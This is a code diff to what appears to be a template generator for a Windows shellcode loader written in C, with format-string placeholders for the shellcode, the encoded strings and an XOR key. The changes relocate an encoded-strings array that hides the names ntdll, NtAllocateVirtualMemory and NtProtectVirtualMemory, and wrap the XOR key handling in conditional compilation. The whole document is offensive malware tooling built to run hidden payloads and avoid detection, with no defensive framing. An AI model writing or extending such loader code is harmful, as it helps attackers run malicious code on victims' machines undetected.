@@ -95,21 +95,26 @@ typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
 );
 
 __attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
+__attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
+
+#ifdef XOR
 __attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
+#endif
 
 __attribute__((section(".text.start")))
 void _start() {{
     SIZE_T size = sizeof(shellcode);
+
+#ifdef XOR
     SIZE_T key_len = sizeof(key);
+#endif
 
     unsigned char stackbuf[{stackbuf_size}];
     char* ntdll_dll               = (char*)&stackbuf[{offsets[0]}];
     char* ntallocatevirtualmemory  = (char*)&stackbuf[{offsets[1]}];
     char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];
 
-    __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
-    
-    for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
+    for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
         stackbuf[i] = enc_strings[i];
 
 #ifdef XOR
